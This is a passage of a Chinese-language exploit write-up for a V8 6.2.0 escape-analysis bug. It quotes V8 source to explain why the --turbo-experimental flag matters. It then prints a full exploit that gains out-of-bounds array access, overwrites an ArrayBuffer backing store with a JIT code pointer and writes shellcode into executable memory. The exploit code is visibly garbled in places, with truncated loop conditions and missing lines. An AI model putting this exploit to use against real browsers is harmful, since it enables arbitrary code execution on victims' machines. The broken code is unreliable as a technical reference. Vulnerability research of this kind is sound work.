现在我们只剩下面这些标志了：
    ./d8 nday.js --turbo-escape --turbo-experimental
标志`--turbo-escape`只是强制转义分析阶段的发生，这个阶段本来就会发生，所以我们可以安全地移除这个标志而不改变exploit的功能性。
最后是`--turbo-experimental`标志。这个标志只影响下面的函数：
    void EscapeAnalysis::ProcessCheckMaps(Node* node) {
      DCHECK_EQ(node->opcode(), IrOpcode::kCheckMaps);
      ForwardVirtualState(node);
      Node* checked = ResolveReplacement(NodeProperties::GetValueInput(node, 0));
      if (FLAG_turbo_experimental) {
        VirtualState* state = virtual_states_[node->id()];
        if (VirtualObject* object = GetVirtualObject(state, checked)) {
          if (!object->IsTracked()) {
            if (status_analysis_->SetEscaped(node)) {
              TRACE(
                  "Setting #%d (%s) to escaped because checked object #%i is not "
                  "tracked\n",
                  node->id(), node->op()->mnemonic(), object->id());
            }
            return;
          }
          CheckMapsParameters params = CheckMapsParametersOf(node->op());
          Node* value = object->GetField(HeapObject::kMapOffset / kPointerSize);
          if (value) {
            value = ResolveReplacement(value);
            // TODO(tebbi): We want to extend this beyond constant folding with a
            // CheckMapsValue operator that takes the load-eliminated map value as
            // input.
            if (value->opcode() == IrOpcode::kHeapConstant &&
                params.maps().contains(ZoneHandleSet(bit_cast>(
                    OpParameter>(value))))) {
              TRACE("CheckMaps #%i seems to be redundant (until now).\n",
                    node->id());
              return;
            }
          }
        }
      }
      if (status_analysis_->SetEscaped(node)) {
        TRACE("Setting #%d (%s) to escaped (checking #%i)\n", node->id(),
              node->op()->mnemonic(), checked->id());
      }
    }
正如上面的函数所示，如果启用了`--turbo-experimental`标志，会有一些额外的功能。如果禁用该标志，exploit不再起作用，因此这些额外的功能对exploit非常重要。
或许只是我们这样以为……但是，在使用gdb和printf进行了一些调试后，我确定这个标志之所以对exploit有用，不是因为`if
(FLAG_turbo_experimental) {`语句中的任何功能，而是因为它允许函数提早`return`，并在执行下面的代码之前退出：
    if (status_analysis_->SetEscaped(node)) {
        TRACE("Setting #%d (%s) to escaped (checking #%i)\n", node->id(),
              node->op()->mnemonic(), checked->id());
      }
这段代码会破坏exploit，如果我们把它注释掉，不管有没有`--turbo-experimental`标志，exploit都能工作。
这段代码会调用下面的函数：
    bool EscapeStatusAnalysis::SetEscaped(Node* node) {
      bool changed = !(status_[node->id()] & kEscaped);
      status_[node->id()] |= kEscaped | kTracked;
      return changed;
    }
为了让exploit在没有`--turbo-experimental`标志时也能工作，我们需要找到一种不需要调用checkMaps也能利用漏洞的方式。回头看原始的PoC，我们发现这个[测试用例](https://chromium.googlesource.com/v8/v8.git/+/2f2f9be7727eac23248fd91a776959d51de6b7c6/test/mjsunit/compiler/escape-analysis-phi-type-2.js)并不需要使用`--turbo-experimental`标志，这大概是因为它没有用到会触发checkMaps的`l[0.a]`。通过在V8中添加printf语句检查checkMaps什么时候会被触发，我证实了这一点。在下一篇文章中，我们会研究是否可以在不强制调用checkMaps的情况下利用此漏洞。
至于现在，先看看带有`--turbo-experimental`标志的完整exploit吧，该exploit适用于V8 6.2.0。
    load('/home/zon8/accidentalnday/int64.js')
    function f(x) {
        var o = { a: 0, b: 0 };
        var initial_oob_array = [1.1, 2.2, 3.3, 4.4];
        oob_array = new Array(20);
        oob_array[0] = 5.5
        oob_array[1] = 6.6
        elements_array = [1337, {}, {}]
        double_array = [1.337, 10.5, 10.5]
        arb_rw_arraybuffer = new ArrayBuffer(0x200)
        shellcode_array_buffer = new ArrayBuffer(0x5421)
        var res;
        for (var i = 0; i  2) {
                if (x % 2 == 0) { o.a = 1; }
            }
            if (i == 0) {
                if (x % 2 == 0) { o.a = 1; }
            }
            initial_oob_array[o.a] = 1.39064994160909e-309;
            o.a = x;
        }
        return res;
    }
    f(0);
    f(1);
    f(0);
    f(1);
    var oob_array = [];
    var elements_array;
    var double_array;
    var arb_rw_arraybuffer;
    var shellcode_array_buffer;
    for (i = 0; i > Found shellcode array buffer offset: " + shellcode_array_buffer_backing_store_offset)
    function jitme(val) {
        return val + 1
    }
    for (i = 0; i > 100000; i++) {
        jitme(1)
    }
    for (i = 0; i > 100000; i++) {
        jitme(1)
    }
    for (i = 0; i > 100000; i++) {
        jitme(1)
    }
    for (i = 0; i > 100000; i++) {
        jitme(1)
    }
    jitme(1)
    const SHELLCODE = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 44, 98, 1, 1, 129, 52, 36, 1, 1, 1, 1, 73, 137, 224, 104, 46, 114, 105, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 69, 68, 59, 32, 47, 98, 105, 110, 80, 72, 184, 101, 99, 104, 111, 32, 80, 87, 78, 80, 73, 137, 225, 106, 1, 254, 12, 36, 65, 81, 65, 80, 87, 106, 59, 88, 72, 137, 230, 153, 15, 5]
    jitted_function_ptr = addr_of(jitme)
    // print("JIT Function: " + jitted_function_ptr)
    let JIT_ptr = read_64(jitted_function_ptr.add(0x38 - 1));
    // print("JIT PTR: " + JIT_ptr)
    // print(JIT_ptr.to_double())
    // print(new Int64(JIT_ptr).to_double())
    // print(Int64.from_double(oob_array[shellcode_array_buffer_backing_store_offset]))
    oob_array[shellcode_array_buffer_backing_store_offset] = JIT_ptr.to_double();
    let shell_code_writer = new Uint8Array(shellcode_array_buffer);
    // print(Int64.from_double(oob_array[shellcode_array_buffer_backing_store_offset]))
    shell_code_writer.set(SHELLCODE);
    res = jitme()